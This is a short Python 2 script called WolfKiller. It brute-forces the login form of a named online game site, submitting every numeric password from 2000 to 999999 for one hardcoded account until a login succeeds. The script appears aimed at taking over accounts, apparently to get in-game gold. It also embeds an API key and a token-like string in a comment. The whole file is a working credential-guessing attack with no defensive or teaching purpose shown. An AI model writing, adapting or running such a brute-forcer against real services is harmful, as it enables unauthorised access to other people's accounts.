#!/usr/bin/env python

import urllib2,cookielib,Cookie
import re
import logging
import os
import time

class WolfKiller:  

    def __init__(self):
        self.logInURL="http://www.langren8.com/loginaction2013.aspx"
        self.userInfoURL="http://www.langren8.com/Service/Service.aspx?api_key=LJfi1j3MNfk1op23&method=ClientUser.GetLoginedUserInfo"     
        self.cookie = cookielib.CookieJar()
        self.httpcookie = urllib2.HTTPCookieProcessor(self.cookie)
        self.opener = urllib2.build_opener(self.httpcookie)
        urllib2.install_opener(self.opener)       
    
        
    def logIn(self,account,password):    
        enparams="account="+account+"&password="+password
        headers = {'Content-Type':'application/x-www-form-urlencoded','Connection':'Keep-Alive'}
        request = urllib2.Request(url = self.logInURL,headers = headers,data=enparams)
        stream=urllib2.urlopen(request)
        result=stream.read()
        if (result.find('index2013.aspx')==-1):
            if(result.find('alert')!=-1):
                return False
#             print "Login failed! Please check your account and password."
            else:
                print result
                return False
        else:
            return True

   

if __name__ == "__main__":

    getGold = WolfKiller()
    
    start=time.time()
    print time.ctime()
    account = "wolfkiller10"
#     password = 'wolfkiller'
    for i in range(2000,999999):
        password = str(i);
        if i%100==0:
            print i
#             time.sleep(10);
        
        if getGold.logIn(account, password):
            print account,password
            break
    
        else:
            continue;
#             print 'failed!'
        
        
    end=time.time()
    print time.ctime()
    print end-start
    
    raw_input("Press Enter to exit....")

    
    
    #   4nfst33yxoup3c55jdpfm5uo

    
    
    
    
    
